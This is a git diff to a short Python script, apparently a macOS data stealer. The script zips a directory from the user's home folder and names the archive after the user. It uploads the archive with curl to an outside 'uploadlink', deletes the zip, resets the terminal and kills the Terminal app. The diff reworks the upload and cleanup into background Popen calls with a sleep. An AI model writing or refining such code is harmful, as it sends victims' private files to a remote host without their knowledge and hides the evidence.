@@ -4,6 +4,7 @@ import shutil
 import getpass
 from os.path import expanduser
 import subprocess
+from time import sleep
 
 home = expanduser("~")
 
@@ -17,11 +18,10 @@ zipname = "./{0}".format(user)
 
 shutil.make_archive(zipname, 'zip', clocation)
 
-try:
-    run_command = subprocess.check_output('curl -F "contact=@{0}.zip" {1}'.format(zipname, uploadlink))
-except subprocess.CalledProcessError:
-    pass
+subprocess.Popen(['curl', '-F', 'contact=@{0}.zip'.format(zipname), uploadlink], stdout=subprocess.PIPE)
+# This is not a good way to handle this but works for now
+sleep(0.5)
+subprocess.Popen(['rm', '-r', '{0}.zip'.format(zipname)], stdout=subprocess.PIPE)
 
-os.remove("./{0}.zip".format(zipname))
 subprocess.call(['tput', 'reset'])
 subprocess.call(['killall', 'Terminal'])
